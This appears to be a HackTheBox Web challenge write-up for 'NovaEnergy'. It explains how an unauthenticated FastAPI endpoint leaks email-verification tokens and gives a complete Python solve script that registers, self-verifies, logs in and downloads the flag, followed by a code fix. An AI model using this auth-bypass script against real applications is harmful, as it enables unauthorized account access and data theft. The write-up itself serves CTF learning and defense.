---
layout: post
title: "NovaEnergy"
date: 2027-07-05 09:00:00 -0500
categories: [HackTheBox, Challenges, Web]
tags: [hackthebox, challenge, web, idor, cwe-306, cwe-639, auth-bypass, information-disclosure, fastapi]
---

## Overview

NovaEnergy is an HTB Web challenge (Easy) presenting a FastAPI file-management vault for a fictional nuclear company. The vulnerability is an unauthenticated [information disclosure](https://cwe.mitre.org/data/definitions/306.html) on the `/userDetails` endpoint: it returns a user's email-verification UUID token without requiring any authentication, allowing an attacker to self-verify their own registration and access the flag file.

**[CWE-306](https://cwe.mitre.org/data/definitions/306.html) — Missing Authentication for Critical Function · [CWE-639](https://cwe.mitre.org/data/definitions/639.html) — Authorization Bypass via User-Controlled Key**

---

## The Technique

### Unauthenticated token leak via `/userDetails`

The OpenAPI spec at `/api/openapi.json` reveals a `UserDetailsResponse` schema:

```json
{
  "id": 2,
  "email": "hacker@gonuclear.com",
  "is_verified": false,
  "created_at": "2026-06-21T14:24:56",
  "verifyToken": "d5306f96-20dd-425a-bf57-71156df7804d"
}
```

`POST /api/userDetails` accepts any email address and returns the full user object — including `verifyToken` — with no authentication header required. This is the verification UUID that `/api/email-verify` accepts to activate the account.

The registration endpoint restricts email domains to `@gonuclear.com`. The intended gate is:
1. Send registration email → user receives token out-of-band
2. POST `/api/email-verify` with the token → account activated

But since `/userDetails` leaks the token for any registered account unauthenticated, step 1 is skippable — an attacker queries their own token immediately after registration.

---

## Solution

`solve.py`:

```python
#!/usr/bin/env python3
import sys, requests, re

HOST = sys.argv[1] if len(sys.argv) > 1 else "target"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 1337
BASE = f"http://{HOST}:{PORT}/api"
s = requests.Session()

# 1. Register (only @gonuclear.com allowed)
s.post(f"{BASE}/register", json={"email":"hacker@gonuclear.com","password":"hacker123"})

# 2. Leak verifyToken — no auth required
r = s.post(f"{BASE}/userDetails", json={"email":"hacker@gonuclear.com"})
token = r.json()["verifyToken"]
print(f"[*] verifyToken: {token}")

# 3. Self-verify
s.post(f"{BASE}/email-verify", json={"email":"hacker@gonuclear.com","token":token})

# 4. Login and list files
r = s.post(f"{BASE}/login", json={"email":"hacker@gonuclear.com","password":"hacker123"})
hdrs = {"Authorization": f"Bearer {r.json()['access_token']}"}
for f in s.get(f"{BASE}/files", headers=hdrs).json():
    if f["original_filename"] == "flag.txt":
        r = s.get(f"{BASE}/files/{f['id']}/download", headers=hdrs)
        print(f"[+] FLAG: {re.search(r'HTB.+', r.text).group()}")
```

```bash
python3 solve.py <host> <port>
```

---

## Why it worked

`/api/userDetails` was designed as an internal lookup but was exposed without an authentication guard. Because it returns the full user row — including the one-time verification token — the email confirmation step provides no security barrier. An attacker who can register an account can immediately self-verify it by querying their own token.

---

## Fix

```python
# 1. Require authentication on /userDetails
@router.post("/userDetails", dependencies=[Depends(get_current_user)])
async def get_user_details(req: UserDetailsRequest, current_user = Depends(get_current_user)):
    # Only allow users to see their own details
    if req.email != current_user.email:
        raise HTTPException(403, "Forbidden")
    ...

# 2. Never return verifyToken in the response schema
class UserDetailsResponse(BaseModel):
    id: int
    email: EmailStr
    is_verified: bool
    created_at: datetime
    # verifyToken OMITTED
```
